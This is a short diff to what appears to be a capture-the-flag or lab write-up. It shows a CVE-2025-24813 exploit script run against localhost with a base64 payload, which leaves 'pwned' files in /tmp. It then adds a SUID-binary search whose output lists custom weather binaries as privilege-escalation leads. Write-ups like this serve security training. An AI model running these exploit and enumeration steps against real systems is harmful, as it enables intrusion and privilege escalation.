@@ -105,3 +105,22 @@ user@weather:~$ python3 CVE-2025-24813.py --host localhost --port 80 --base64-pa
 user@weather:~$ ls /tmp/
 hsperfdata_root  hsperfdata_snowcat  hsperfdata_user  pwned  this_worked
 ```
+
+```
+user@weather:~$ find / -perm -4000 -type f 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/authbind/helper
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/sudo
+/usr/local/weather/humidity
+/usr/local/weather/pressure
+/usr/local/weather/temperature
+```
